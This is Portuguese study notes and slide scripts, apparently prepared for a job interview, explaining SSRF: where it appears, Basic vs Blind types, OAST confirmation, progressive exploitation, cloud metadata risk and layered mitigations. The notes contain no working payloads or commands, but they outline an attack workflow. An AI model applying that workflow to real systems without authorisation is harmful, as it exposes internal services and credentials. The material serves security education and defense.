# Server-Side Attacks (CWES)

- **SSRF** (Server-Side Request Forgery)
    
    https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
    
    - **Slides + detalhes**
        
        # SLIDE 1 — **SSRF (Server-Side Request Forgery)**
        
        ### O que vai no slide (recap)
        
        - Título + seu nome
        
        ### O que eu falo (10–20s)
        
        **Versão curta (direta):**
        
        - “Vou apresentar SSRF de forma bem prática: conceito, como identificar/confirmar, como ele escala em ambientes modernos e como prevenir.”
        
        **Versão com tom mais maduro:**
        
        - “Vou cobrir SSRF com foco em risco real: o que é, onde aparece, como provar e como mitigar com defense-in-depth.”
        
        **Frase de encerramento do slide:**
        
        - “No final, fico feliz de responder perguntas e aprofundar qualquer parte.”
        
        ---
        
        # SLIDE 2 — **Roteiro da apresentação**
        
        ### O que vai no slide (recap)
        
        - 4 blocos (What / Find / Exploit / Prevent) + (Impact/Case).
        
        ### O que eu falo (15–25s)
        
        **Versão A (clara e controlada):**
        
        - “Eu vou seguir uma linha simples: primeiro o modelo mental, depois como eu encontro e confirmo, depois como exploraria de forma progressiva e, por fim, prevenção — incluindo o que dá errado e como fazer certo.”
        
        **Versão B (já preparando o avaliador):**
        
        - “Como o tempo é curto, eu foco no núcleo. Algumas técnicas mais detalhadas ficam como backup caso vocês queiram aprofundar no Q&A.”
        
        **Ponto que pega bem:**
        
        - “Vou tentar manter didático, sem virar ‘tutorial de ferramenta’.”
        
        ---
        
        # SLIDE 3 — **O que é SSRF? (Definição + intuição)**
        
        ### O que vai no slide (recap)
        
        3 bullets no máximo, definindo SSRF.
        
        ---
        
        ## O que eu falo (1–2 minutos) — escolha uma linha narrativa
        
        ### Linha 1 (definição “academia” + maturidade)
        
        1. “SSRF é quando uma aplicação faz requisições server-side e o atacante consegue influenciar o destino dessa requisição.”
        2. “O ponto central é: não é o meu browser fazendo a chamada — é o backend.”
        3. “Por isso a gravidade depende do que o backend consegue alcançar: rede interna, serviços, cloud metadata, etc.”
        
        **Fecho bom:**
        
        - “Então SSRF não é só ‘validar URL’; é confiança + arquitetura.”
        
        ---
        
        ### Linha 2 (intuição/analogia simples — muito didática)
        
        Use uma analogia que não fique boba:
        
        - “É como se eu convencesse a empresa a mandar um funcionário (o servidor) buscar algo para mim.”
        - “Eu, do lado de fora, não entro na sala interna. Mas se eu consigo convencer alguém de dentro a ir lá buscar, eu ganho acesso indireto.”
        - “No SSRF, esse ‘funcionário’ é o backend, e a ‘sala interna’ é a rede interna/metadata.”
        
        **Fecho:**
        
        - “O perigo é que o funcionário tem chaves que eu não tenho.”
        
        ---
        
        ### Linha 3 (definição por ‘feature legítima’ — excelente para Offsec)
        
        - “SSRF normalmente nasce de uma feature legítima: buscar estoque, baixar avatar por URL, gerar preview, webhook.”
        - “O erro é quando o sistema deixa o usuário controlar o destino sem validação robusta e sem controle de saída.”
        - “Aí o backend vira um proxy involuntário.”
        
        **Fecho:**
        
        - “Por isso eu sempre caço SSRF em qualquer lugar com ‘server-side fetching’.”
        
        ---
        
        ## Extra (se perguntarem ali mesmo)
        
        **“SSRF é sempre HTTP?”**
        
        - “Quase sempre envolve HTTP/HTTPS porque são os fluxos mais comuns, mas o conceito é o backend fazer request; dependendo do stack, outros schemes podem entrar.”
        
        **“Qual a diferença de SSRF pra open redirect?”**
        
        - “Open redirect manda o cliente ir para outro lugar; SSRF faz o backend ir.”
        
        ---
        
        # SLIDE 4 — **Quem faz a requisição? (Browser vs Backend)**
        
        *(mantemos o slide, mas com título bom)*
        
        ### O que vai no slide (recap)
        
        Duas colunas (Browser vs Server) + setas (internet vs internet+interna)
        
        ---
        
        ## O que eu falo (1 minuto) — o objetivo é “fixar” o ponto-chave
        
        ### Versão 1 (bem objetiva e forte)
        
        - “Esse slide existe para fixar uma ideia: SSRF muda o jogo porque o request sai do servidor.”
        - “O servidor enxerga coisas que o usuário não enxerga: redes privadas, serviços internos e, em cloud, endpoints internos.”
        - “Então às vezes a vulnerabilidade não parece grave… até você perceber o alcance do servidor.”
        
        **Fecho:**
        
        - “SSRF é essencialmente uma falha de trust boundary + network reach.”
        
        ---
        
        ### Versão 2 (comparação com CSRF para evitar confusão)
        
        - “CSRF usa a sessão do usuário. SSRF usa a rede do servidor.”
        - “Por isso SSRF costuma ter impacto de infraestrutura e CSRF impacto de ação do usuário.”
        
        ---
        
        ### Versão 3 (conecta com mitigação futura)
        
        - “Quando alguém tenta resolver SSRF só com regex de URL, ignora que o problema também é de rede: egress, segmentação, e confiança interna.”
        
        ---
        
        ## Frases curtas que soam muito bem
        
        - “A origem do request muda tudo.”
        - “O backend tem um ‘ponto de vista’ privilegiado da rede.”
        - “SSRF é uma vulnerabilidade de aplicação com consequências de infraestrutura.”
        
        ---
        
        # SLIDE 5 — **Como SSRF acontece (fluxo / trust boundary)**
        
        *(o slide âncora — você precisa falar bem aqui)*
        
        ### O que vai no slide (recap)
        
        Diagrama base: User → WebApp → Fetch → Target + “internal boundary”
        
        ---
        
        ## O que eu falo (2 minutos) — escolha uma versão e treine
        
        ### Versão A (fluxo “feature legítima” passo a passo)
        
        1. “Primeiro existe uma feature normal: ‘Check stock’, ‘Fetch image’, ‘Webhook’.”
        2. “Essa feature pega um parâmetro que vira destino de requisição.”
        3. “Se eu consigo controlar esse destino, eu consigo apontar para onde eu quiser.”
        4. “Se o backend tiver acesso a rede interna, eu ganho alcance interno sem estar na rede interna.”
        
        **Fecho:**
        
        - “Isso é SSRF: input do usuário → request do servidor → destino fora do esperado.”
        
        ---
        
        ### Versão B (fluxo com 3 fases: entrada, validação, execução)
        
        Isso é MUITO bom porque prepara o tema de bypass/parsing:
        
        1. “Fase 1: entrada — eu controlo um campo URL/host/path.”
        2. “Fase 2: validação — o sistema tenta decidir ‘pode/não pode’.”
        3. “Fase 3: execução — a biblioteca HTTP realmente resolve DNS, segue redirect e conecta.”
        
        **Fecho:**
        
        - “Bypass nasce quando validação e execução não batem, ou quando não há egress control.”
        
        ---
        
        ### Versão C (fluxo ‘escala de impacto’ já preparando os próximos slides)
        
        1. “Primeiro eu provo que consigo fazer o backend chamar algo externo (confirma SSRF).”
        2. “Depois tento alcance interno: localhost, ranges internos.”
        3. “Se o contexto for cloud, o impacto pode subir muito (metadata).”
        4. “E a mitigação correta precisa ser em camadas.”
        
        **Fecho:**
        
        - “O que eu quero aqui é mostrar que SSRF é uma escada: começa pequeno e pode virar crítico.”
        
        ---
        
        ## Pontos de fala “avançados”, mas rápidos (para soar maduro)
        
        Use só 1–2 destes:
        
        - “O risco não é a URL em si, é o **alcance** e o **contexto da infra**.”
        - “Algumas apps seguem redirects automaticamente — isso muda a exploração.”
        - “Uma allowlist ingênua pode falhar se não validar destino final (DNS/IP).”
        
        ---
        
        ## Mini-perguntas que você pode antecipar (e responder em 1 frase)
        
        **“Mas isso sempre dá impacto?”**
        
        - “Não; severidade depende do que o backend alcança e dos controles de saída. Eu vou falar disso no impacto.”
        
        **“Como você provaria que é SSRF?”**
        
        - “Basic: resposta reflete. Blind: OAST/callback. Vou mostrar mais adiante.”
        
        ---
        
        # Um “script” de transição entre 3 → 4 → 5 (fica muito fluido)
        
        - Slide 3 (definição): “SSRF é o backend fazendo requisições por você.”
        - Slide 4 (quem faz): “O detalhe crítico é que o request sai do servidor.”
        - Slide 5 (fluxo): “E aqui está o fluxo típico de como isso acontece numa feature real.”
        
        Isso deixa a abertura muito coesa e te dá confiança.
        
        # SLIDE 6 — **Onde SSRF costuma aparecer (Identification)**
        
        ## Objetivo real
        
        Mostrar mentalidade de auditor: “eu sei **onde procurar** SSRF”, não só explorar.
        
        ## Títulos bons (topo do slide)
        
        1. **Onde SSRF aparece com frequência**
        2. **Pontos típicos de SSRF em aplicações**
        3. **SSRF: superfícies comuns (Discovery)**
        4. **Onde eu procuro SSRF primeiro** *(bem pessoal e bom)*
        
        ## O que colocar no slide (curto, categorizado)
        
        Sugestão: **6 categorias** (igual ao que você já mapeou):
        
        - **Link preview / Unfurl**
        - **Webhooks / Callbacks**
        - **Avatar/thumbnail por URL**
        - **Import por URL** (CSV/JSON/XML)
        - **PDF/relatórios**
        - **Integrações / stock check / “fetch API”**
        
        **Opcional (bem pequeno):**
        
        - “qualquer feature que faz *server-side fetch*” (uma linha no rodapé)
        
        ## Visual (recomendado)
        
        - **Grid de ícones** (2 linhas x 3 colunas) — muito fácil de entender rápido.
        - Se quiser um toque “Rana style”: manter o mesmo cenário e destacar “check stock”, mas eu prefiro o grid aqui (mais rápido).
        
        ## O que você fala (45–60s) — roteiro pronto
        
        **Versão A (didática):**
        
        - “Pra achar SSRF eu não começo com payload. Eu começo com funcionalidade.”
        - “Qualquer lugar que o servidor ‘busca’ um recurso remoto pode ser SSRF.”
        - “Então eu priorizo: preview de link, webhooks, imagem por URL, importação por URL, PDF engines e integrações.”
        - “Depois eu procuro o parâmetro onde o destino entra: url/host/path/callback.”
        
        **Versão B (mais madura/curta):**
        
        - “Meu critério é: existe um fetch server-side? Se sim, existe chance de SSRF.”
        - “Daí eu vou para confirmação e classificação (basic/blind).”
        
        ## Mini “gancho” para o próximo slide
        
        - “A partir desses pontos, a pergunta é: como eu diferencio Basic de Blind e como eu provo?”
        
        ---
        
        # SLIDE 7 — **Tipos de SSRF (Basic vs Blind)** *(visão geral)*
        
        ## Objetivo real
        
        Deixar muito claro que isso muda **evidência** e **estratégia**.
        
        ## Títulos bons
        
        1. **Tipos de SSRF (visão geral)**
        2. **SSRF: Basic vs Blind**
        3. **Classificando SSRF: refletido vs cego**
        
        ## O que colocar no slide (tabela minimalista)
        
        Duas colunas (Basic / Blind), 3 linhas no máximo:
        
        - **O que você vê**
        - **Como comprova**
        - **O que muda no teste**
        
        Exemplo de texto curtíssimo:
        
        - Basic: “conteúdo retorna” / “prova na resposta” / “exploração direta”
        - Blind: “conteúdo não retorna” / “prova via OAST/callback + sinais” / “inferência e cuidado”
        
        ## Visual
        
        - Tabela clean ou “card duplo”
        - Ícones: 👁️ (basic), 📡 (blind)
        
        ## O que você fala (45–60s)
        
        **Versão A:**
        
        - “Depois de suspeitar de SSRF, a primeira coisa que eu faço é classificar: Basic ou Blind.”
        - “Basic me dá evidência na resposta; Blind não.”
        - “Isso muda tudo: em Blind, eu tenho que provar por callback (OAST) ou por sinais comportamentais.”
        
        **Versão B (inclui o tema do falso positivo sem aprofundar):**
        
        - “Em Blind eu uso OAST, mas sempre me preocupo com falsos positivos — por exemplo bots de preview ou meu próprio browser.”
        
        ## Gancho para os próximos slides (8 e 9)
        
        - “Agora vou mostrar um exemplo real de cada um (com prints).”
        
        ---
        
        # SLIDE 8 — **Tipos de SSRF: Basic SSRF (exemplo)**
        
        ## Objetivo real
        
        **Provar** que você sabe identificar/confirmar um SSRF quando a resposta reflete.
        
        Não é para “ensinar a usar Burp”, é para contar a história com evidência.
        
        ## Títulos bons (mesmo topo “Tipos de SSRF” funciona)
        
        - Topo (fixo): **Tipos de SSRF**
        - Subtítulo grande: **Basic SSRF (exemplo)**
        
        ou, se preferir no topo:
        
        1. **Basic SSRF (exemplo prático)**
        2. **SSRF refletido (Basic) — evidência**
        
        ## O que colocar no slide (pouco)
        
        - 1 print seu grande (o mais claro)
        - 2 bullets pequenos:
            - “Resposta do destino retorna para o usuário”
            - “Evidência fácil de demonstrar”
        
        **Opcional** (se couber sem poluir):
        
        - uma seta destacando o parâmetro que contém URL/host
        
        ## Visual recomendado
        
        - Print + marcação discreta (retângulo no parâmetro e no trecho da resposta)
        - Mini fluxinho (ícone): User → App → Target → Response back
        
        ## O que você fala (1–2 minutos) — escolha um estilo
        
        **Versão A (história curta):**
        
        1. “Aqui eu tenho uma funcionalidade que faz fetch.”
        2. “Eu altero o destino no parâmetro controlável.”
        3. “A resposta muda e eu consigo ver conteúdo/erro coerente do alvo.”
        4. “Isso prova SSRF basic.”
        
        **Versão B (mais madura: evidência e limites):**
        
        - “Isso é uma evidência forte porque o conteúdo retornado é consistente com o destino e aparece dentro do fluxo do app.”
        - “Se o app sanitiza a resposta, ainda pode ser basic, só que com menos visibilidade.”
        
        **Versão C (ponte para exploração progressiva):**
        
        - “Uma vez confirmado basic SSRF, o próximo passo é medir alcance: localhost, rede interna, etc. (mais adiante).”
        
        ## Armadilhas para você evitar ao falar
        
        - Não virar tutorial de Burp.
        - Não listar payloads.
        - Só provar conceito e evidência.
        
        ---
        
        # SLIDE 9 — **Tipos de SSRF: Blind SSRF (exemplo)**
        
        ## Objetivo real
        
        Mostrar maturidade: quando não há resposta, você ainda sabe **provar** e **não cair em falso positivo**.
        
        ## Títulos bons
        
        - Topo: **Tipos de SSRF**
        - Subtítulo: **Blind SSRF (exemplo)**
            
            ou
            
        1. **Blind SSRF (exemplo prático)**
        2. **SSRF cego — evidência via OAST**
        
        ## O que colocar no slide
        
        - Print seu (blind) grande
        - 2–3 bullets:
            - “Conteúdo não retorna”
            - “Confirmação via OAST (DNS/HTTP callback)”
            - “Cuidado: falsos positivos (cliente/bots/validação parcial)”
        
        **Se você tiver um print do Interactsh/Collaborator:**
        
        coloque uma mini imagem no canto mostrando o callback (fica perfeito).
        
        ## Visual recomendado
        
        - Print principal + mini “callback screenshot”
        - Linha do tempo: Request → Callback
        
        ## O que você fala (1–2 minutos) — roteiro pronto e forte
        
        **Versão A (muito clara):**
        
        1. “Aqui eu suspeito que o backend está tentando acessar a URL, mas a aplicação não me mostra o conteúdo.”
        2. “Então eu mudo o destino para um domínio controlado e verifico se há callback.”
        3. “Se eu recebo callback, eu tenho evidência de que o request saiu do servidor.”
        
        **Versão B (o diferencial: falsos positivos em 20s):**
        
        - “Eu sempre tomo cuidado com falso positivo: o callback pode vir do meu browser ou de bots de preview. Por isso eu correlaciono timing e uso identificadores únicos.”
        
        **Versão C (ponte para o próximo slide de confirmação):**
        
        - “Esse é o motivo de eu ter um slide separado de ‘Como confirmar SSRF’, porque a evidência muda completamente.”
        
        ---
        
        # Dica de ouro: como fazer 6–9 ficarem muito fluidos (transições)
        
        Use frases de ponte:
        
        - Slide 6 → 7: “Depois de achar possíveis pontos, eu classifico o SSRF.”
        - Slide 7 → 8: “Agora um exemplo de Basic.”
        - Slide 8 → 9: “E quando não retorna conteúdo, vira Blind — e a evidência muda.”
        
        Isso dá sensação de narrativa e controle.
        
        ---
        
        # Opcional (se você achar que 6–9 está “muito longo”)
        
        Você pode compactar:
        
        - Slide 7 (tabela Basic vs Blind) + Slide 8/9 (exemplos) = manter.
        - Slide 6 (onde aparece) é muito bom para entrevista — eu manteria.
        - **Slides**
            
            # Outline final com títulos melhores (NÚCLEO)
            
            ## Slide 1 — **SSRF (Server-Side Request Forgery)**
            
            **No slide (conteúdo):**
            
            - Seu nome + “Entrevista técnica – 15 min”
            - 1 frase curta: “Abuso de requisições feitas pelo servidor para destinos controláveis”
                
                **Visual:** fundo limpo + um ícone de “server”
                
                **Você fala:** “Vou cobrir conceito → como identificar → como explorar de forma progressiva → impacto real → prevenção.”
                
            
            ---
            
            ## Slide 2 — **Roteiro da apresentação**
            
            **No slide:**
            
            - 4 blocos (bem simples):
                1. O que é / como funciona
                2. Como identificar e confirmar
                3. Escalada e impacto (incl. cloud)
                4. Prevenção (errada → bypass → correta)
                    
                    **Visual:** linha do tempo/4 caixas
                    
                    **Você fala:** “Vou focar no core; detalhes extras ficam no apêndice para perguntas.”
                    
            
            ---
            
            ## Slide 3 — **O que é SSRF?**
            
            **No slide (bullets curtos):**
            
            - “A aplicação faz um *server-side fetch*”
            - “Atacante influencia destino (URL/host/path)”
            - “O request sai do servidor → alcance de rede muda”
                
                **Visual:** 1 frase “SSRF = Server faz request em seu lugar” + seta
                
                **Você fala:** definição + uma frase de maturidade: “não é só input validation; é trust boundary + arquitetura.”
                
            
            ---
            
            ## Slide 4 — **Por que “SERVER-SIDE” muda tudo**
            
            (Esse slide evita confusão com CSRF/Open Redirect)
            
            **No slide:**
            
            - Client-side (browser) vs Server-side (backend)
            - “Backend enxerga rede interna / serviços restritos”
                
                **Visual:** duas colunas (Browser vs Server) com setas para destinos diferentes
                
                **Você fala:** “o que torna SSRF perigoso é o servidor ter acesso diferente do usuário.”
                
            
            ---
            
            ## Slide 5 — **Como SSRF acontece (modelo mental)**
            
            **No slide:**
            
            - “Input não confiável atravessa trust boundary”
            - “Validação fraca + fetcher com acesso amplo”
                
                **Visual (âncora):** seu diagrama base:
                
                User → Web App → (Fetch) → Target + “Internal Network Boundary”
                
                **Você fala:** conta a história da feature legítima “check stock / fetch image”.
                
            
            ---
            
            ## Slide 6 — **Onde SSRF costuma aparecer (Identification)**
            
            **No slide (lista curta por categoria):**
            
            - Link preview / Unfurl
            - Webhooks / Callbacks
            - Avatar/thumbnail por URL
            - Import por URL (CSV/JSON/XML)
            - PDF/relatórios
            - Stock check / integrações
                
                **Visual:** grid de ícones (6)
                
                **Você fala:** “eu caço SSRF procurando ‘server-side fetching’.”
                
            
            ---
            
            ## Slide 7 — **Tipos de SSRF**
            
            *(Aqui seu título do topo serve para os dois slides: Basic e Blind)*
            
            **No slide (visão geral):**
            
            - Basic: resposta/reflexo visível
            - Blind: sem reflexo → evidência indireta
                
                **Visual:** tabela 2 colunas (Basic/Blind) com 2 linhas: “evidência” e “técnica”
                
                **Você fala:** “isso muda totalmente como eu confirmo e exploro.”
                
            
            ---
            
            ## Slide 8 — **Tipos de SSRF**
            
            *(mesmo título; foco em Basic)*
            
            **No slide:**
            
            - Subtítulo grande: “Basic SSRF (Reflected)”
            - 2–3 bullets: “conteúdo retorna”, “prova rápida”, “bom para demonstrar impacto”
            - Seu print principal (bem grande)
                
                **Visual:** print + mini setas (antes/depois)
                
                **Você fala:** descreve o que mudou e como isso prova o fetch server-side.
                
            
            ---
            
            ## Slide 9 — **Tipos de SSRF**
            
            *(mesmo título; foco em Blind)*
            
            **No slide:**
            
            - Subtítulo: “Blind SSRF”
            - 2–3 bullets: “sem conteúdo”, “prova via callback/OAST”, “pistas: timing/erro”
            - Seu print principal (blind) + pequeno ícone “callback”
                
                **Visual:** print + pequena timeline “request → callback”
                
                **Você fala:** explica a diferença e por que OAST entra aqui.
                
            
            ---
            
            ## Slide 10 — **Como confirmar SSRF (e evitar falso positivo)**
            
            **No slide (checklist de evidência):**
            
            - Basic: “resposta consistente do alvo”
            - Blind: “OAST (DNS/HTTP callback)”
            - Cuidado: “browser/bots/validação parcial”
                
                **Visual:** checklist com ✅ / ⚠️
                
                **Você fala:** explica “falso positivo” em 20–30s (o request pode vir do cliente/bot, não do backend).
                
            
            > Observação sua: Burp/Proxy/FoxyProxy
            > 
            > 
            > Aqui eu sugiro só 1 linha verbal: “normalmente eu intercepto com Burp (proxy)”.
            > 
            > Se quiser, deixamos “Ferramentas” para apêndice.
            > 
            
            ---
            
            ## Slide 11 — **Exploração progressiva (workflow)**
            
            **No slide:** uma “escada” (bem limpa) com etapas curtas:
            
            1. Confirmar / classificar (basic/blind)
            2. Caracterizar restrições (redirect, allowlist, egress, schemes)
            3. Medir alcance (localhost → rede interna)
            4. Encontrar alvos de alto valor
            5. Escalar impacto e documentar
                
                **Visual:** escada numerada
                
                **Você fala:** isso te salva em Q&A — mostra método, não tentativa-e-erro.
                
            
            ---
            
            ## Slide 12 — **Checkpoint: o que muda o caminho?**
            
            **No slide:** 4 caixas “Se…”:
            
            - Se Blind → OAST / sinais indiretos
            - Se filtro/allowlist → bypass categories + open redirect
            - Se segue redirect → revalidação final importa
            - Se Cloud → metadata como alvo crítico
                
                **Visual:** mini árvore de decisão (bem minimalista)
                
                **Você fala:** “isso organiza a exploração sem ficar confuso”.
                
            
            ---
            
            ## Slide 13 — **SSRF em Cloud (Metadata)**
            
            *(bloco separado, curto e forte)*
            
            **No slide:**
            
            - “Por que piora em cloud: identidade/credenciais temporárias”
            - “Metadata service como alvo interno”
            - “IMDSv2: token reduz SSRF trivial (não elimina SSRF)”
                
                **Visual:** mini diagrama App → Metadata → Credenciais → Recursos
                
                **Você fala:** 1 minuto. Não virar palestra, só impacto moderno.
                
            
            ---
            
            ## Slide 14 — **Impacto do SSRF (CIA + Caso real)**
            
            *(o slide “estrela” estilo Rana)*
            
            **No slide (layout recomendado em 2 colunas):**
            
            **Esquerda: CIA triad**
            
            - C (Confidentiality): acesso a dados internos / credenciais
            - I (Integrity): ações internas indevidas (ex.: endpoints admin)
            - A (Availability): DoS via fetch/loops/requests caros
            
            **Direita: Caso real (Capital One 2019)**
            
            - 1 headline curta
            - 1 cadeia de 4 passos (SSRF → metadata → credenciais → dados)
                
                **Visual:** metade matriz CIA, metade “cadeia” do caso real
                
                **Você fala:** “isso mostra por que SSRF é contextual e pode ir de low a critical.”
                
            
            ---
            
            ## Slide 15 — **Mitigações comuns (e por que falham)**
            
            **No slide (anti-pattern cards ⚠️):**
            
            - Blacklist de localhost
            - startsWith/regex simples
            - Validar só URL inicial
            - Seguir redirects sem revalidar
                
                **Visual:** cards com ⚠️
                
                **Você fala:** “são comuns, mas falham por parsing/normalização/DNS/redirect.”
                
            
            ---
            
            ## Slide 16 — **Bypass (categorias) + Open Redirect chaining**
            
            **No slide (organização por categoria, não lista gigante):**
            
            - “String-based pitfalls” (parsing/normalização)
            - “DNS/hostname pitfalls” (host ≠ IP final)
            - “Redirect chaining” (Open Redirect)
            - “Encoding/representações”
                
                **Visual:** 4 cards + um mini fluxo “SSRF → 302 → destino interno”
                
                **Você fala:** foca no *porquê* (validar string ≠ validar destino final). Mostra maturidade.
                
            
            ---
            
            ## Slide 17 — **Mitigação correta (Defense-in-Depth)**
            
            **No slide:** 3 camadas (bem visual):
            
            - Application layer: allowlist robusta, validar IP final, controlar redirects, limites/timeout/logs
            - Network layer: egress filtering, segmentação, deny-by-default
            - Cloud layer: hardening metadata/IMDSv2 e políticas
                
                **Visual:** “camadas empilhadas”
                
                **Você fala:** cita OWASP SSRF Prevention Cheat Sheet como base (forte).
                
            
            ---
            
            ## Slide 18 — **Conclusões (takeaways)**
            
            **No slide (3 mensagens):**
            
            1. SSRF = trust boundary + backend privilegiado
            2. Impacto é contextual (CIA + cloud)
            3. Prevenção é por camadas (não só regex)
                
                **Visual:** 3 bullets grandes + ícones
                
            
            ---
            
            ## Slide 19 — **Referências e recursos**
            
            **No slide:**
            
            - QR code (para doc/links)
            - lista curta: PortSwigger SSRF, OWASP WSTG/cheat sheet, HackTricks, PayloadsAllTheThings, Rana Khalil slides, etc.
                
                **Visual:** QR + 6–8 fontes no máximo (as demais ficam no doc)
                
            
            ---
            
            # Apêndice (backup Q&A) — títulos também “de topo”
            
            Esses você não apresenta, só abre se perguntarem:
            
            **A1 — Ferramentas usadas (Manual + OAST)**
            
            **A2 — Automação: quando ajuda / quando atrapalha**
            
            **A3 — Open Redirect chaining (detalhe visual)**
            
            **A4 — Enumeração interna (portas/diretórios/subdomínios) — visão de alto nível**
            
            **A5 — Schemes (file://, gopher://): quando considerar**
            
            **A6 — Blind SSRF: sinais indiretos e limitações**
            
            **A7 — Cloud extra: IMDSv1 vs IMDSv2 (curto)**
            
            **A8 — Severidade: exemplos (low vs critical)**
            
            **A9 — Referências estendidas**
            
            ---
            
            # Agora, “o que colocar” em cada slide (com mais detalhes) — dicas práticas
            
            Para não virar um textão impossível de usar, eu deixo aqui “regras de preenchimento” que servem para todos os slides:
            
            ### 1) Texto no slide: pouco, mas certeiro
            
            - **Máximo 4–6 bullets**
            - Bullets com **substantivo + verbo**, não frases longas
            - O detalhe vai na sua fala e (se quiser) nas notas
            
            ### 2) Sempre 1 “objetivo do slide”
            
            Antes de preencher qualquer slide, se pergunte:
            
            - “Esse slide existe para provar o quê?”
                
                Ex.: “provar que entendo evidência”, “provar que sei escalar impacto”, “provar que sei prevenir”.
                
            
            ### 3) Use seus prints só onde têm valor
            
            - **Basic** e **Blind**: prints grandes (prova).
            - Bypass/redirect: 1 print ou 1 diagrama, não ambos.
            
            ### 4) Visual padrão (consistência)
            
            - Reaproveitar seu diagrama “âncora” em 3 momentos:
                - funcionamento
                - exploração progressiva
                - cloud/impacto
                    
                    Isso dá sensação de domínio e evita dispersão.
                    
            
            ---
            
            Se você quiser, próximo passo eu faço duas versões do deck com esse mesmo outline:
            
            - **Versão “Lean” (15–16 slides)** (mais rápida, sem perder nada essencial)
            - **Versão “Full” (19 slides)** (essa de cima)
            
            E eu também posso sugerir **tempo por slide** (pra caber certinho em 15 minutos).
            
    - **Resumos**
        
        # Módulo 1 — SSRF: conceito, modelo mental e por que é relevante
        
        SSRF (*Server-Side Request Forgery*) acontece quando uma aplicação faz **requisições server-side** (por exemplo, buscar uma imagem por URL, consultar um “stock API”, gerar preview de um link) e o atacante consegue **influenciar o destino** dessa requisição. O ponto-chave é que **quem faz o request é o servidor**, não o navegador do usuário. Isso muda totalmente o jogo, porque o servidor normalmente tem um “ponto de vista” diferente do cliente: ele pode enxergar a rede interna, ter permissões específicas, e acessar serviços que não estão expostos publicamente.
        
        O melhor jeito de explicar SSRF é com um modelo mental simples: existe um **fluxo de confiança** onde um input do usuário atravessa um limite (trust boundary) e vira uma ação “confiável” do backend. O usuário fornece algo que parece inocente (uma URL), o backend assume que isso é seguro e faz a requisição. Se essa validação for fraca, o atacante passa a “dirigir” o backend para onde ele quiser — incluindo alvos internos. Por isso SSRF não é apenas “validação de URL”: é uma falha de **design e confiança**, e o impacto depende do quanto o backend consegue alcançar.
        
        Em entrevistas, você precisa mostrar que entende que SSRF é “mais grave” do que parece por causa do **alcance de rede**. Um SSRF pode ir de algo baixo (só busca sites públicos) para algo crítico (acessa painéis internos, APIs internas, ou em cloud atinge serviços de metadata e credenciais temporárias). A maturidade aparece quando você fala: “o risco real é o que o servidor pode alcançar + quais ativos existem por trás”.
        
        ---
        
        # Módulo 2 — Onde SSRF costuma aparecer (mentalidade de caça / discovery)
        
        Você caça SSRF pensando assim: “onde o backend faz fetch de alguma coisa?”. SSRF quase sempre nasce de features que precisam, por design, “buscar recursos”. Então, em vez de procurar “SSRF” diretamente, você procura **funcionalidades** que aceitam URLs, hosts, caminhos, ou que montam requisições para um segundo sistema.
        
        Os lugares mais comuns são:
        
        - **Link preview/unfurl**: sistemas que recebem uma URL e geram preview (título, imagem, descrição).
        - **Imagem por URL** (avatar/thumbnail): o servidor baixa a imagem para armazenar ou processar.
        - **Import por URL**: importar CSV/JSON/XML a partir de uma URL.
        - **Webhooks/callbacks**: o sistema envia requisições para um endpoint “configurado” pelo usuário.
        - **Integrações** (stock check, disponibilidade, consulta de preço): o backend chama outro serviço e o destino pode ficar influenciável.
        - **Geração de PDF/relatórios**: engines de PDF frequentemente baixam recursos externos (imagens/CSS).
        - **Conversores e scanners**: qualquer serviço que “inspeciona” conteúdo remoto.
        
        Na prática, sua abordagem madura é: ao interceptar requests (Burp), você busca parâmetros e padrões como `url`, `link`, `path`, `redirect`, `callback`, `webhook`, `image`, `api`, `stockApi`. Mas não é só procurar nome do parâmetro: às vezes o destino está escondido no body, em JSON, em headers, ou é montado no backend com parte controlável (por exemplo, você controla o `path` e ele é concatenado numa base URL). Você também observa funcionalidades “comportamentais”: botões de “check stock”, “next product”, “availability check”, “import from URL”, porque frequentemente esses fluxos geram chamadas server-side.
        
        O que impressiona em entrevista é você explicar que SSRF é sobre **“server-side fetching”**: se a feature não faz request no backend, não é SSRF. E que a caça eficiente começa pelos lugares em que isso é mais provável, não tentando payloads aleatórios em todo parâmetro.
        
        ---
        
        # Módulo 3 — Tipos de SSRF (Basic vs Blind) e o que muda na prática
        
        Depois de suspeitar de SSRF, a primeira classificação importante é: **Basic SSRF** ou **Blind SSRF**. Essa distinção muda completamente sua estratégia.
        
        No **Basic SSRF**, a aplicação retorna de alguma forma o resultado da requisição que o backend fez. Você muda o destino e consegue observar diferenças na resposta: pode ver HTML, erros específicos, mensagens ou conteúdo que provam que o backend acessou outro host/rota. É o cenário mais “didático”: confirmar e demonstrar impacto costuma ser mais fácil, porque a evidência está na própria interface/resposta.
        
        No **Blind SSRF**, o backend faz a requisição, mas você não recebe o conteúdo de volta. Às vezes o app só retorna “OK” ou “Something went wrong”. Nesse caso, o objetivo é provar a interação por outro caminho. É aqui que entram conceitos como **OAST (Out-of-band Application Security Testing)**: você usa um domínio/endpoint controlado (Burp Collaborator/Interactsh) e observa se o backend “te contata” (DNS/HTTP callback). Isso é sua prova de que *o servidor* tentou alcançar o destino.
        
        Um detalhe importante (e onde muita gente se confunde) é o tema dos **falsos positivos** em Blind SSRF. “Falso positivo” aqui não é “achei bug mas não tem”. É algo mais específico: é quando você vê um callback e conclui “o backend vulnerável chamou meu domínio”, mas na verdade quem chamou foi outra coisa — por exemplo, seu próprio navegador (porque você abriu a URL), um bot de preview de alguma ferramenta, ou um mecanismo que só resolveu DNS para validar formato. Por isso, quando você fala de Blind SSRF de forma madura, você sempre menciona que precisa correlacionar o callback com a ação, usar valores únicos e evitar que o cliente faça requests sem querer.
        
        Por fim, existe o que podemos chamar de “semi-blind”: casos em que não há conteúdo refletido, mas existem sinais indiretos consistentes (diferença de tempo, de erro, de status). Esses sinais são úteis, mas não devem ser tratados como prova absoluta sozinhos. A postura profissional é: combinar OAST (quando possível) com sinais comportamentais para ter evidência robusta.
        
        # Módulo 4 — Confirmação (OAST), evidências e como evitar falsos positivos
        
        Quando você está diante de um possível SSRF, a primeira meta é **confirmar com evidência convincente**. Em **Basic SSRF**, isso geralmente é direto: você altera o destino e observa a resposta mudando de forma coerente (conteúdo, HTML, headers, mensagens de erro). Já em **Blind SSRF**, a confirmação é o grande desafio porque a aplicação não te devolve o conteúdo. É por isso que **OAST (Out-of-band Application Security Testing)** é tão importante.
        
